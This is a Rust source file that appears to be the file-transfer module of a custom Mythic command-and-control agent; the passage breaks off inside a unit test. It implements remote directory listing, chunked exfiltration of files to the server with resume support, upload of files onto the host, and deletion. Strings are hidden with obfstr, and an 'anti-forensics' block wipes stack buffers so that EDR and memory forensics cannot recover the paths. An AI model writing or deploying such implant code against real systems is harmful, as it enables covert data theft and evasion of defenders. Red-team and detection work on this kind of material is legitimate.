// 未完成:
// 1. utf8和utf16之间经常需要转换,应当抽象出来以后复用(三件套等都用的上)

//! # 本地物理文件传输/file browser/屏幕截图业务模块 (File & Screenshot Transfer Adapter)
//!
//! ## 架构分层定位 (Tier 3: 业务适配层)
//!
//! 1. **专注于本地文件与操作系统 I/O**：
//!    - 维护本地文件路径 (`full_path`)、显示文件名 (`filename`) 与来源主机 (`host`)；
//!    - 负责屏幕截图标记 (`is_screenshot: true`) 路由；
//!    - 处理本地物理文件句柄 (`Read + Seek`) 与底层 I/O 错误映射。
//! 2. **内部组合通用传输引擎 ([`TransferSession`])**：
//!    - 将所有 Mythic 4.0 纯字节偏移 (0-based Offset) 协议、传输前握手注册、断点续传握手 (Resume)、
//!      以及基于 [`crate::protocol::StackWorkspace4K`] 的纯栈数据泵送，全权委托给 [`crate::stream::TransferSession`]。
//! 3. **100% 零堆纯栈契约 (Zero-Heap OPSEC)**：
//!    - 路径与名称仅借用 (`&'a str`)，文件 UUID 栈数组自持 (`[u8; 36]`)，无任何动态堆分配。

pub use crate::error::FileTransferError;
use crate::engine::{extract_param, TaskExecutionWorkspace, MAX_FILES_PER_SLOT};
use crate::protocol::{
    ActiveStackWorkspace, FileBrowserChildItem, FileBrowserResponse, FileDownloadResponse,
    FilePermissions, ServerTaskPostResponseItem, TaskResponseItem,
};
pub use crate::stream::{ZeroRead, ZeroSeek, ZeroWrite};
pub use crate::transfer::{
    TransferReceiveSession, TransferRegisterMeta, TransferSession, TransferSource,
};
use obfstr::obfstr;

// 需要添加注释
#[cfg(windows)]
mod win32 {
    #[link(name = "kernel32")]
    unsafe extern "system" {
        pub fn GetFullPathNameW(
            lpFileName: *const u16,
            nBufferLength: u32,
            lpBuffer: *mut u16,
            lpFilePart: *mut *mut u16,
        ) -> u32;
    }
}

/// 活动下载会话状态 (纯栈无堆分配，固定缓冲区持久化跟踪)
#[derive(Clone, Copy)]
#[cfg_attr(any(debug_assertions, test), derive(Debug))]
pub struct ActiveDownload {
    pub task_id: [u8; 36],
    pub task_id_len: usize,
    pub path_buf: [u8; 260],
    pub path_len: usize,
    pub file_id: Option<[u8; 36]>,
    pub total_size: i64,
    pub current_offset: u64,
    pub is_registered: bool,
    pub is_complete: bool,
}

impl ActiveDownload {
    pub fn new(task_id: &str, file_path: &str, total_size: i64) -> Self {
        let mut tid = [0u8; 36];
        let t_len = task_id.len().min(36);
        tid[..t_len].copy_from_slice(&task_id.as_bytes()[..t_len]);

        let mut p_buf = [0u8; 260];
        let p_len = file_path.len().min(260);
        p_buf[..p_len].copy_from_slice(&file_path.as_bytes()[..p_len]);

        Self {
            task_id: tid,
            task_id_len: t_len,
            path_buf: p_buf,
            path_len: p_len,
            file_id: None,
            total_size,
            current_offset: 0,
            is_registered: false,
            is_complete: false,
        }
    }

    #[inline]
    pub fn task_id_str(&self) -> &str {
        core::str::from_utf8(&self.task_id[..self.task_id_len]).unwrap_or("")
    }

    #[inline]
    pub fn path_str(&self) -> &str {
        core::str::from_utf8(&self.path_buf[..self.path_len]).unwrap_or("")
    }

    #[inline]
    pub fn file_id_str(&self) -> Option<&str> {
        self.file_id
            .as_ref()
            .and_then(|id| core::str::from_utf8(id).ok())
    }
}

/// 活动上传会话状态 (纯栈无堆分配，固定缓冲区持久化跟踪)
#[derive(Clone, Copy)]
#[cfg_attr(any(debug_assertions, test), derive(Debug))]
pub struct ActiveUpload {
    pub task_id: [u8; 36],
    pub task_id_len: usize,
    pub file_id: [u8; 36],
    pub file_id_len: usize,
    pub path_buf: [u8; 260],
    pub path_len: usize,
    pub current_chunk_num: u32,
    pub total_chunks: u32,
    pub chunk_size: u32,
    pub is_complete: bool,
}

impl ActiveUpload {
    pub fn new(task_id: &str, file_id: &str, remote_path: &str, chunk_size: u32) -> Self {
        let mut tid = [0u8; 36];
        let t_len = task_id.len().min(36);
        tid[..t_len].copy_from_slice(&task_id.as_bytes()[..t_len]);

        let mut fid = [0u8; 36];
        let f_len = file_id.len().min(36);
        fid[..f_len].copy_from_slice(&file_id.as_bytes()[..f_len]);

        let mut p_buf = [0u8; 260];
        let p_len = remote_path.len().min(260);
        p_buf[..p_len].copy_from_slice(&remote_path.as_bytes()[..p_len]);

        Self {
            task_id: tid,
            task_id_len: t_len,
            file_id: fid,
            file_id_len: f_len,
            path_buf: p_buf,
            path_len: p_len,
            current_chunk_num: 1,
            total_chunks: 0,
            chunk_size,
            is_complete: false,
        }
    }

    #[inline]
    pub fn task_id_str(&self) -> &str {
        core::str::from_utf8(&self.task_id[..self.task_id_len]).unwrap_or("")
    }

    #[inline]
    pub fn file_id_str(&self) -> &str {
        core::str::from_utf8(&self.file_id[..self.file_id_len]).unwrap_or("")
    }

    #[inline]
    pub fn path_str(&self) -> &str {
        core::str::from_utf8(&self.path_buf[..self.path_len]).unwrap_or("")
    }
}

/// 本地物理文件接收与落盘会话 (Mythic -> Agent 文件下发与落盘)
#[derive(Clone, Copy, PartialEq, Eq)]
#[cfg_attr(any(debug_assertions, test), derive(Debug))]
pub struct FileReceiveSession<'a> {
    pub session: TransferReceiveSession<'a>,
}

pub type UploadSession<'a> = FileReceiveSession<'a>;

impl<'a> FileReceiveSession<'a> {
    #[inline]
    pub fn new(
        task_id: &'a str,
        file_id_str: &str,
        chunk_size: u32,
        full_path: Option<&'a str>,
    ) -> Result<Self, FileTransferError> {
        Ok(Self {
            session: TransferReceiveSession::new(task_id, file_id_str, chunk_size, full_path)?,
        })
    }
}

// ==========================================
// 本地物理文件下载/外发会话包装器
// ==========================================

/// 本地物理文件下载/外发会话 (组合通用 TransferSession)
#[derive(Clone, Copy, PartialEq, Eq)]
#[cfg_attr(any(debug_assertions, test), derive(Debug))]
pub struct FileDownloadSession<'a> {
    /// 目标文件本地完整路径 (借用自任务下发参数，如 `Some("C:\\Windows\\Temp\\data.bin")`)
    pub full_path: Option<&'a str>,
    /// 显示文件名 (借用，如 `Some("data.bin")`)
    pub filename: Option<&'a str>,
    /// 来源主机名称 (借用，可选)
    pub host: Option<&'a str>,
    /// 是否作为屏幕截图归档 (默认 false；若为 true 则 Mythic 自动路由到专有截图查看器)
    pub is_screenshot: bool,
    /// 内嵌的通用传输会话状态机
    pub session: TransferSession<'a>,
}

/// 保持向后兼容别名
pub type DownloadSession<'a> = FileDownloadSession<'a>;

impl<'a> FileDownloadSession<'a> {
    /// 创建新的文件下载外发会话
    ///
    /// * `task_id`: 触发该外发的任务 UUID
    /// * `full_path`: 本地文件绝对路径 (可选)
    /// * `filename`: 显示文件名 (可选)
    /// * `total_size`: 文件总字节数 (未知可传 -1)
    #[inline]
    pub const fn new(
        task_id: &'a str,
        full_path: Option<&'a str>,
        filename: Option<&'a str>,
        total_size: i64,
    ) -> Self {
        Self {
            full_path,
            filename,
            host: None,
            is_screenshot: false,
            session: TransferSession::new(task_id, total_size),
        }
    }

    /// 设置来源主机名 (可选)
    #[inline]
    pub const fn with_host(mut self, host: Option<&'a str>) -> Self {
        self.host = host;
        self
    }

    /// 设置是否标记为屏幕截图
    #[inline]
    pub const fn with_screenshot(mut self, is_screenshot: bool) -> Self {
        self.is_screenshot = is_screenshot;
        self
    }

    /// 使用已有定长 36 字节 file_id 创建会话 (用于从持久化记录或崩溃后恢复断点续传)
    #[inline]
    pub const fn new_with_file_id(
        task_id: &'a str,
        full_path: Option<&'a str>,
        filename: Option<&'a str>,
        total_size: i64,
        file_id: [u8; 36],
        current_offset: u64,
    ) -> Self {
        Self {
            full_path,
            filename,
            host: None,
            is_screenshot: false,
            session: TransferSession::new_with_transfer_id(
                task_id,
                total_size,
                file_id,
                current_offset,
            ),
        }
    }

    // ----------------- 属性代理 -----------------

    #[inline(always)]
    pub fn task_id(&self) -> &'a str {
        self.session.task_id
    }

    #[inline(always)]
    pub fn current_offset(&self) -> u64 {
        self.session.current_offset
    }

    #[inline(always)]
    pub fn total_size(&self) -> i64 {
        self.session.total_size
    }

    #[inline(always)]
    pub fn is_complete(&self) -> bool {
        self.session.is_complete
    }

    #[inline(always)]
    pub fn is_resumed(&self) -> bool {
        self.session.is_resumed
    }

    #[inline(always)]
    pub fn file_id_str(&self) -> Option<&str> {
        self.session.transfer_id_str()
    }

    #[inline(always)]
    pub fn update_total_size(&mut self, new_size: i64) {
        self.session.update_total_size(new_size);
    }

    #[inline(always)]
    pub fn mark_complete(&mut self) {
        self.session.mark_complete();
    }

    // ----------------- 步骤 1: 构造注册元数据与注册报文 -----------------

    /// 提取注册元数据
    #[inline]
    pub fn register_meta(&self) -> TransferRegisterMeta<'a> {
        TransferRegisterMeta {
            total_size: self.session.total_size,
            filename: self.filename,
            full_path: self.full_path,
            host: self.host,
            is_screenshot: self.is_screenshot,
        }
    }

    /// 构造首次注册请求载荷
    #[inline]
    pub fn build_registration_response(&self) -> FileDownloadResponse<'a> {
        self.session.build_register_payload(self.register_meta())
    }

    /// 构造包含注册请求的顶层 TaskResponseItem
    #[inline]
    pub fn build_registration_task_response(&self) -> TaskResponseItem<'a> {
        self.session.build_register_task_response(self.register_meta())
    }

    /// 处理服务端注册回执
    #[inline]
    pub fn handle_registration_ack(
        &mut self,
        resp: &ServerTaskPostResponseItem<'_>,
    ) -> Result<&str, FileTransferError> {
        self.session.handle_register_ack(resp)
    }

    // ----------------- 步骤 2: 切片 ACK 确认 -----------------

    /// 处理服务端切片确认
    #[inline]
    pub fn handle_chunk_ack(
        &mut self,
        resp: &ServerTaskPostResponseItem<'_>,
    ) -> Result<u64, FileTransferError> {
        self.session.handle_chunk_ack(resp)
    }

    // ----------------- 步骤 3: 断点续传 -----------------

    /// 构造断点续传请求
    #[inline]
    pub fn build_resume_request(&self) -> Result<FileDownloadResponse<'_>, FileTransferError> {
        self.session.build_resume_payload()
    }

    /// 构造断点续传顶层 TaskResponseItem
    #[inline]
    pub fn build_resume_task_response(&self) -> Result<TaskResponseItem<'_>, FileTransferError> {
        self.session.build_resume_task_response()
    }

    /// 处理断点续传确认回执
    #[inline]
    pub fn handle_resume_ack(
        &mut self,
        resp: &ServerTaskPostResponseItem<'_>,
    ) -> Result<u64, FileTransferError> {
        self.session.handle_resume_ack(resp)
    }

    // ----------------- 步骤 4: 结合文件句柄与 ActiveStackWorkspace 读取分片 -----------------

    /// 从文件句柄中读取带 Jitter 的分片并封包
    #[inline]
    pub fn read_next_chunk_file<'buf, 'sess, R>(
        &'sess mut self,
        reader: &mut R,
        workspace: &'buf mut ActiveStackWorkspace,
        use_jitter: bool,
    ) -> Result<(FileDownloadResponse<'sess>, usize), FileTransferError>
    where
        R: ZeroRead + ZeroSeek,
        'buf: 'sess,
    {
        self.session.pump_file_chunk(reader, workspace, use_jitter)
    }

    /// 统一从多态数据源中读取分片
    #[inline]
    pub fn read_next_chunk<'buf, 'sess, 'src, R>(
        &'sess mut self,
        source: &mut TransferSource<'src, R>,
        workspace: &'buf mut ActiveStackWorkspace,
        use_jitter: bool,
    ) -> Result<(FileDownloadResponse<'sess>, usize), FileTransferError>
    where
        R: ZeroRead + ZeroSeek,
        'buf: 'sess,
    {
        self.session.pump_next_chunk(source, workspace, use_jitter)
    }

    /// 便捷方法：从内存切片中读取分片
    #[inline]
    pub fn read_next_chunk_slice<'buf, 'sess>(
        &'sess mut self,
        slice: &[u8],
        workspace: &'buf mut ActiveStackWorkspace,
        use_jitter: bool,
    ) -> Result<(FileDownloadResponse<'sess>, usize), FileTransferError>
    where
        'buf: 'sess,
    {
        self.session.pump_slice_chunk(slice, workspace, use_jitter)
    }
}

// ==========================================
// File Browser & 传输任务执行分发函数 (Mythic 4.0 Hooking & Tasking)
// ==========================================

/// 零堆从文件路径中截取纯文件名
#[inline]
pub fn extract_filename(path: &str) -> &str {
    // trim_end_matches只重复剔除末尾斜杠
    let clean = path.trim_end_matches(['\\', '/']);
    // 找到从右向左的第一个分隔符.返回其位置
    if let Some(pos) = clean.rfind(['\\', '/']) {
        // 切出pos+1后的所有字符,拿到文件名
        &clean[pos + 1..]
    } else {
        clean
    }
}

/// 构建符合 Mythic 4.0 规范的文件条目项 (FileBrowserChildItem)
#[inline]
pub fn build_file_browser_child<'a>(
    is_file: bool,
    name: &'a str,
    access_time: u64,
    modify_time: u64,
    size: u64,
    permissions: Option<FilePermissions<'a>>,
) -> FileBrowserChildItem<'a> {
    FileBrowserChildItem {
        is_file,
        permissions,
        name,
        access_time,
        modify_time,
        size,
    }
}

/// 构建符合 Mythic 4.0 规范的顶层文件浏览器响应对象 (FileBrowserResponse)
#[inline]
pub fn build_file_browser_response<'a>(
    name: &'a str,
    parent_path: &'a str,
    is_file: bool,
    size: u64,
    access_time: u64,
    modify_time: u64,
    success: bool,
    files: &'a [FileBrowserChildItem<'a>],
) -> FileBrowserResponse<'a> {
    FileBrowserResponse {
        host: None,
        is_file,
        permissions: None,
        name,
        parent_path,
        success,
        access_time,
        modify_time,
        size,
        update_deleted: None,
        set_as_user_output: None,
        files,
    }
}

/// 执行目录列表枚举并填充结构化 file_browser 响应 (Mythic 4.0 file_browser:list 核心实现)
/// 
/// task_id和target_path由服务端填充,然后提交给数据库的任务队列,在agent拉取任务时下发给agent
/// 具体来说target_path是经过 ls.py清洗整合后的路径,并不保证是绝对路径,也不保证不包含mythic无法识别的 ./../~等特殊符号(web ui情况下), UTF-8 编码
pub fn execute_ls(
    task_id: &str,
    target_path: &str,
    exec_ws: &mut TaskExecutionWorkspace,
) {
    // parent_buf代表被列举目标自身解析后的路径(full_path或path_file拼接),规范化与编码转换的纯栈中转:Win32 底层 API 输出的是 UTF-16 宽字符 ([u16; 260]);Mythic 协议与 Rust 字符串切片需要的是 UTF-8 字节编码 (&str),所以需要转换.Mythic 官方文档明确不支持 ./../~等操作符(终端中常用,如ls ..)Agent 必须调用操作系统原生能力（GetFullPathNameW）将.等特殊符号解析为完整的绝对路径（如 C:\Users\Administrator），而 parent_buf正是承接解析结果的载体
    // 置为512:Windows 经典最大路径常量 MAX_PATH 为 260 个宽字符([u16; 260] )（包含盘符 C:\和末尾空字符 \0）.即wpath的定义.
    // [u16; 260]=520字节,[0u8; 512]=512字节.但是内存大,并不代表容纳的字符数多.而取决于编码方式UTF-16 宽字符,每个字符占用u16(2字节),而utf-8变长编码(这里最多可容纳 512英文字符,最多容纳约170个中文字符)
    let mut parent_buf = [0u8; 512];
    #[cfg(windows)]
    let mut wpath = [0u16; 260];
    #[cfg(windows)]
    let mut wbuf = [0u16; 260];
    #[cfg(windows)]
    let parent_len = {
        let mut wpath_len = 0;
        // encode_utf16():边遍历、边算边转的方式(无堆分配)把 UTF-8转成 UTF-16;
        for c in target_path.encode_utf16() {
            // 预留最后一个字符,之后填充为L'\0'
            if wpath_len < wpath.len() - 1 {
                wpath[wpath_len] = c;
                wpath_len += 1;
            }
        }
        // 末尾手动写入 0（即 L'\0'）,满足 Win32 要求的APILPCWSTR（以空字符结尾的宽字符串指针）
        wpath[wpath_len] = 0;

        // 防御性兜底,直接通过os api获取绝对路径
        let wlen = unsafe {
            // 该函数成功时，返回值 wlen 是有效字符数，不包含末尾的 null 空字符
            win32::GetFullPathNameW(
                wpath.as_ptr(),
                wbuf.len() as u32,
                wbuf.as_mut_ptr(),
                core::ptr::null_mut(),
            )
        };
        // 将win32::GetFullPathNameW获取的utf16的绝对路径转为utf8,存入parent_buf
        // 再次验证GetFullPathNameW 的返回值,0代表api调用失败;且返回值不能大于wbuf.len()
        // 否则(即wlen=0/wlen >= wbuf.len()),当原始路径大于 512时,只截取前512字节,并放弃路径转换,直接使用下发的路径字符串.当API 失败，返回了 wlen = 0也把原始的 target_path 原封不动塞进 parent_buf
        if wlen > 0 && (wlen as usize) < wbuf.len() {
            let mut off = 0;
            // 从utf16转回utf8 wbuf[..wlen]经过iter后变成切片（&[u16]）;decode_utf16要求参数是u16;copied() 把&T 解引用复制为 T
            // decode_utf16返回DecodeUtf16(一个实现了Iterator trait的结构体,即迭代器),但在for in中,在每一次步进时调用.next()，自动剥离了外层的 Option，把迭代器产出的 Item（也就是Result）交给了循环变量 ch
            for ch in core::char::decode_utf16(wbuf[..wlen as usize].iter().copied())
            {
                //unwrap_or() 是安全、稳健的防御性写法,返回指定的默认值,而不是panic退出,保证程序活着
                let c = ch.unwrap_or(core::char::REPLACEMENT_CHARACTER);

                // off代表当前字节下标位置,len_utf8:当前字符转为utf8需要多少字节(1-4之间),off + c.len_utf8()表示遍历所有字符的位置;parent_buf.len()代表安全上限512
                // 即遍历wbuf每个字符,之后将每个字符转为utf8,存入parent_buf中
                if off + c.len_utf8() <= parent_buf.len() {
                    let s = c.encode_utf8(&mut parent_buf[off..]);
                    off += s.len();
                }
            }
            off
        } else // 两种情况后续都有处理(已经实现)
        {
            let n = target_path.len().min(parent_buf.len());
            parent_buf[..n].copy_from_slice(&target_path.as_bytes()[..n]);
            n
        }
    };
    #[cfg(not(windows))]
    let parent_len = {
        let abs = std::fs::canonicalize(target_path)
            .ok()
            .and_then(|p| p.to_str().map(|s| s.as_bytes().to_vec()))
            .unwrap_or_else(|| target_path.as_bytes().to_vec());
        let n = abs.len().min(parent_buf.len());
        parent_buf[..n].copy_from_slice(&abs[..n]);
        n
    };

    // utf8转为&str(string slice),虽然&str底层就是slice of bytes(&u[u8]).但rust绝不允许二者视为一种类型.&str是符合utf8的&[u8]
    // 否则直接使用传入的target_path作为绝对路径
    let parent_path = core::str::from_utf8(&parent_buf[..parent_len]).unwrap_or(target_path);
    // 将提取的文件名(也有可能是目录名)存入,后续会处理这两种情况
    let dir_name = extract_filename(parent_path);
    // 极端场景:Linux 下查的是根目录 "/"，或者在 Windows下查的是根 "\\" 那么trim_end_matches 把斜杠剥掉后，字符串直接变成了空字符串 ""而extract_filename也会得到"" 这种情况下用parent_path作为它的名字兜底
    let dir_name = if dir_name.is_empty() { parent_path } else { dir_name };
    // 调用系统api （Windows 上 GetFileAttributesExW，Linux上 stat来查询这个目标本身的物理元数据
    let dir_meta = std::fs::metadata(target_path).ok();
    // as_ref()从外层借用转为对内层数据的借用
    // 这里as_ref().map()是转移所有权的.其中as_ref(&self,借用)返回Option<&Metadata>,并创建了临时变量承接返回结果,此时dir_meta的所有权并没有转移,其发起的是只读借用.而map(self)转移了所有权,但转移的是临时变量的所有权.因此dir_meta所有权没有转移,后续仍可使用.
    let dir_is_file = dir_meta.as_ref().map(|m| m.is_file()).unwrap_or(false);
    let dir_size = dir_meta.as_ref().map(|m| m.len()).unwrap_or(0);
    // 链式调用,每一步都消耗上步的临时变量,无堆分配,甚至Option都在编译时被剔除了.只有栈上的临时变量,且用完就丢弃.
    // 最终得到距离 1970年UNIX纪元 的时间差(u64),后续可以转为公元时间
    let dir_atime = dir_meta
        .as_ref()
        .and_then(|m| m.accessed().ok())
        .and_then(|t| t.duration_since(std::time::UNIX_EPOCH).ok())
        .map(|d| d.as_millis() as u64)
        .unwrap_or(0);
    // 修改时间
    let dir_mtime = dir_meta
        .as_ref()
        .and_then(|m| m.modified().ok())
        .and_then(|t| t.duration_since(std::time::UNIX_EPOCH).ok())
        .map(|d| d.as_millis() as u64)
        .unwrap_or(0);

    // 栈上临时收集条目名与元数据,用于后续组成符合mythic规范的FileBrowserChildItem结构体
    // 存放所有文件名缓冲区的二维数组,每个文件名最大260个字符(win规定);AX_FILES_PER_SLOT: usize = 32
    let mut names_buf = [[0u8; 260]; MAX_FILES_PER_SLOT];
    // 每个文件名的长度,配合names_buf,切出文件名
    let mut names_len = [0usize; MAX_FILES_PER_SLOT];
    // 
    let mut entry_meta = [(false, 0u64, 0u64, 0u64); MAX_FILES_PER_SLOT];
    // 当前实际已读取并保存的子项有效总数.当前设置的栈缓冲区最多只能容纳32项
    let mut entry_count = 0usize;

    if let Ok(read) = std::fs::read_dir(target_path) {
        for entry in read.flatten() {
            if entry_count >= MAX_FILES_PER_SLOT {
                break;
            }
            let Ok(ft) = entry.file_type() else { continue };
            let Ok(md) = entry.metadata() else { continue };
            let fname = entry.file_name();
            let name_str = match fname.to_str() {
                Some(s) => s,
                None => continue,
            };
            let n_bytes = name_str.as_bytes();
            let n_len = n_bytes.len().min(names_buf[entry_count].len());
            names_buf[entry_count][..n_len].copy_from_slice(&n_bytes[..n_len]);
            names_len[entry_count] = n_len;

            let atime = md
                .accessed()
                .ok()
                .and_then(|t| t.duration_since(std::time::UNIX_EPOCH).ok())
                .map(|d| d.as_millis() as u64)
                .unwrap_or(0);
            let mtime = md
                .modified()
                .ok()
                .and_then(|t| t.duration_since(std::time::UNIX_EPOCH).ok())
                .map(|d| d.as_millis() as u64)
                .unwrap_or(0);

            entry_meta[entry_count] = (ft.is_file(), atime, mtime, md.len());
            entry_count += 1;
        }
    }

    exec_ws.record_file_browser_from_parts(
        task_id,
        dir_name,
        parent_path,
        dir_is_file,
        dir_size,
        dir_atime,
        dir_mtime,
        &names_buf[..entry_count],
        &names_len[..entry_count],
        &entry_meta[..entry_count],
    );

    // ==========================================
    // 核心 OPSEC 物理内存擦除 (Anti-Forensics & Stack Zeroization)
    // ==========================================
    //
    // 【第一梯队：致命威胁 - 明文字符串缓冲区（全量物理擦除）】
    // 1. 擦除目标绝对路径 UTF-8 缓冲区 (512 字节)
    crate::buffer::zeroize_slice(&mut parent_buf);
    // 2. 擦除探测到的所有子文件名矩阵 (8,320 字节)
    for slot in names_buf.iter_mut() {
        crate::buffer::zeroize_slice(slot);
    }
    // 3. 擦除 Windows 原生 UTF-16 宽字符路径缓冲区 (520 + 520 = 1,040 字节)
    // 彻底销毁在 Windows 栈底残留的 UTF-16LE 宽字符明文，杜绝 EDR/取证工具按 16-bit 编码扫描出探测路径
    #[cfg(windows)]
    unsafe {
        let wpath_bytes = core::slice::from_raw_parts_mut(
            wpath.as_mut_ptr().cast::<u8>(),
            core::mem::size_of_val(&wpath),
        );
        crate::buffer::zeroize_slice(wpath_bytes);

        let wbuf_bytes = core::slice::from_raw_parts_mut(
            wbuf.as_mut_ptr().cast::<u8>(),
            core::mem::size_of_val(&wbuf),
        );
        crate::buffer::zeroize_slice(wbuf_bytes);
    }

    // 【第二梯队：无语义纯数字标量（不进行显式擦除的理由）】
    // 包含变量：names_len, entry_meta, entry_count, dir_size, dir_atime, dir_mtime 等。
    // 不显式擦除的理由：
    // 1. 缺乏情报与特征价值：它们仅为离散整型纯数值（如子项数量 15、大小 4096、UNIX 毫秒时间戳等），
    //    在内存转储（Memory Dump）或取证分析中与正常的调用栈噪声、随机返回地址、RBP 指针毫无区别，
    //    无法提取出任何攻击特征码（IOC）或判定线索；
    // 2. 寄存器优先分配：在 Release 优化构建下，这些基础标量大都直接分配常驻于 CPU 寄存器（如 RAX/RDX/RCX 等），
    //    在随后的系统调用或其它函数调用中会被自然冲刷覆写，无需额外耗费 CPU 周期执行 volatile 逐字节写入。
}

/// 处理 download 命令分发与传输会话注册 (Mythic 4.0 file_browser:download)
pub fn execute_download(
    task_id: &str,
    params: &str,
    exec_ws: &mut TaskExecutionWorkspace,
    active_download: &mut Option<ActiveDownload>,
) {
    let path_param = extract_param(params, obfstr!("file_path"));
    let target_file = if path_param.is_empty() {
        let p = extract_param(params, obfstr!("path"));
        if p.is_empty() {
            extract_param(params, obfstr!("file"))
        } else {
            p
        }
    } else {
        path_param
    };
    if !target_file.is_empty() {
        #[cfg(windows)]
        let size_opt = crate::stream::NativeFileHandle::open_read(target_file)
            .ok()
            .and_then(|h| h.file_size().ok())
            .map(|s| s as i64);
        #[cfg(not(windows))]
        let size_opt = std::fs::metadata(target_file).ok().map(|m| m.len() as i64);

        if let Some(file_size) = size_opt {
            let filename = extract_filename(target_file);
            let file_sess = FileDownloadSession::new(
                task_id,
                Some(target_file),
                Some(filename),
                file_size,
            );
            let reg_resp = file_sess.build_registration_response();
            let dl = ActiveDownload::new(task_id, target_file, file_size);
            exec_ws.record_download_response(
                task_id,
                reg_resp,
                obfstr!("file download registration initiated"),
                true,
                false,
            );
            *active_download = Some(dl);
        } else {
            exec_ws.record_response(task_id, obfstr!("file not found"), false, true);
        }
    } else {
        exec_ws.record_response(task_id, obfstr!("missing file path argument"), false, true);
    }
}

/// 处理 upload 命令分发与传输请求生成 (Mythic 4.0 file_browser:upload)
pub fn execute_upload(
    task_id: &str,
    params: &str,
    exec_ws: &mut TaskExecutionWorkspace,
    active_upload: &mut Option<ActiveUpload>,
) {
    let remote_path = {
        let p = extract_param(params, obfstr!("remote_path"));
        if p.is_empty() {
            let p2 = extract_param(params, obfstr!("path"));
            if p2.is_empty() {
                extract_param(params, obfstr!("destination"))
            } else {
                p2
            }
        } else {
            p
        }
    };
    let file_id = {
        let fid = extract_param(params, obfstr!("file"));
        if fid.is_empty() {
            extract_param(params, obfstr!("file_id"))
        } else {
            fid
        }
    };
    if !remote_path.is_empty() && !file_id.is_empty() {
        let chunk_size = 512 * 1024;
        if let Ok(recv_sess) = FileReceiveSession::new(task_id, file_id, chunk_size, Some(remote_path)) {
            let req = recv_sess.session.build_chunk_request();
            let ul = ActiveUpload::new(task_id, file_id, remote_path, chunk_size);
            exec_ws.record_upload_response(
                task_id,
                req,
                obfstr!("file upload initiated"),
                true,
                false,
            );
            *active_upload = Some(ul);
        } else {
            exec_ws.record_response(task_id, obfstr!("failed to initialize upload session (invalid UUID)"), false, true);
        }
    } else {
        exec_ws.record_response(task_id, obfstr!("missing remote_path or file argument"), false, true);
    }
}

/// 执行文件/目录删除 (Mythic 4.0 file_browser:remove)
pub fn execute_rm(
    task_id: &str,
    params: &str,
    exec_ws: &mut TaskExecutionWorkspace,
) {
    let path_param = extract_param(params, obfstr!("path"));
    let target_file = if path_param.is_empty() {
        let p = extract_param(params, obfstr!("file"));
        if p.is_empty() {
            extract_param(params, obfstr!("file_path"))
        } else {
            p
        }
    } else {
        path_param
    };

    if target_file.is_empty() {
        exec_ws.record_response(task_id, obfstr!("missing path argument for rm"), false, true);
        return;
    }

    let res = std::fs::remove_file(target_file).or_else(|_| std::fs::remove_dir(target_file));
    match res {
        Ok(_) => {
            exec_ws.record_response(task_id, obfstr!("file removed successfully"), true, true);
        }
        Err(_) => {
            exec_ws.record_response(task_id, obfstr!("failed to remove file"), false, true);
        }
    }
}

// ==========================================
// 单元测试
// ==========================================

#[cfg(test)]
mod tests {
    use super::*;
    use crate::protocol::ActiveBudget;
    use std::io::Cursor;

    #[test]
    fn test_file_download_session_lifecycle_and_resume() {
        let mut session = FileDownloadSession::new(
            "task-file-1",
            Some("C:\\Windows\\Temp\\agent.bin"),
            Some("agent.bin"),
            6000,
        )
        .with_host(Some("PC-TARGET"))
        .with_screenshot(true);

        // 1. 验证注册报文与截图路由标记
        let reg = session.build_registration_response();
        assert_eq!(reg.total_size, Some(6000));
        assert_eq!(reg.filename, Some("agent.bin"));
        assert_eq!(reg.full_path, Some("C:\\Windows\\Temp\\agent.bin"));
        assert_eq!(reg.host, Some("PC-TARGET"));
        assert_eq!(reg.is_screenshot, Some(true));

        let task_resp = session.build_registration_task_response();
        assert_eq!(task_resp.task_id, "task-file-1");
        assert!(task_resp.download.is_some());

        // 2. 模拟服务端下发 36 字节 UUID
        let sample_uuid = "22223333-4444-5555-6666-777788889999";
        let reg_ack = ServerTaskPostResponseItem {
            task_id: "task-file-1",
            status: "success",
            file_id: Some(sample_uuid),
            ..Default::default()
        };
        let file_id = session.handle_registration_ack(&reg_ack).unwrap();
        assert_eq!(file_id, sample_uuid);
        assert_eq!(session.file_id_str(), Some(sample_uuid));

        // 3. 模拟使用 ActiveStackWorkspace 发送分片
        let mut fake_file = vec![0x77u8; 100_000];
        let mut cursor = Cursor::new(&mut fake_file[..]);
        let mut workspace = ActiveStackWorkspace::new();

        let (chunk1, bytes1) = session
            .read_next_chunk_file(&mut cursor, &mut workspace, true)
            .unwrap();
        assert_eq!(chunk1.chunk_offset, Some(0));
        assert!(bytes1 >= ActiveBudget::min_raw_read().min(session.total_size() as usize));
        assert_eq!(bytes1 % 3, 0);
        assert_eq!(session.current_offset(), bytes1 as u64);

        // 4. 模拟断点续传
        let resume_req = session.build_resume_request().unwrap();
        assert_eq!(resume_req.file_id, Some(sample_uuid));
        assert_eq!(resume_req.resume, Some(true));

        let resume_ack = ServerTaskPostResponseItem {
            task_id: "task-file-1",
            status: "success",
            file_id: Some(sample_uuid),
            chunk_offset: Some(3000),
            total_size: Some(6000),
            ..Default::default()
        };
        let resumed_off = session.handle_resume_ack(&resume_ack).unwrap();
        assert_eq!(resumed_off, 3000);
        assert_eq!(session.current_offset(), 3000);
        assert!(session.is_resumed());
    }

    #[test]
    fn test_file_download_session_full_stream() {
        let mut fake_file = [0xAAu8; 3500];
        let mut cursor = Cursor::new(&mut fake_file[..]);

        let sample_uuid = "ffffffff-eeee-dddd-cccc-bbbbbbbbbaaa";
        let mut uuid_arr = [0u8; 36];
        uuid_arr.copy_from_slice(sample_uuid.as_bytes());

        let mut session = FileDownloadSession::new_with_file_id(
            "task-full",
            Some("C:\\Data\\log.txt"),
            Some("log.txt"),
            3500,
            uuid_arr,
            0,
        );

        let mut workspace = ActiveStackWorkspace::new();

        while !session.is_complete() {
            let (chunk, bytes) = session
                .read_next_chunk_file(&mut cursor, &mut workspace, false)
                .unwrap();
            assert!(bytes > 0);
            assert!(chunk.chunk_offset.is_some());
        }

        assert_eq!(session.current_offset(), 3500);
        assert!(session.is_complete());
    }

    #[test]
    fn test_execute_ls_and_file_operations() {
        let mut exec_ws = TaskExecutionWorkspace::new();

        // 1. 测试 execute_ls 对当前目录枚举
        {
            execute_ls("task-ls-test", ".", &mut exec_ws);
            let mut items = crate::buffer::StackVec::<TaskResponseItem, 16>::new();
            exec_ws.build_items(&mut items);
            assert_eq!(items.len(), 1);
            assert_eq!(items[0].task_id, "task-ls-test");
            assert!(items[0].file_browser.is_some());
            let fb = items[0].file_browser.as_ref().unwrap();
            assert!(fb.success);
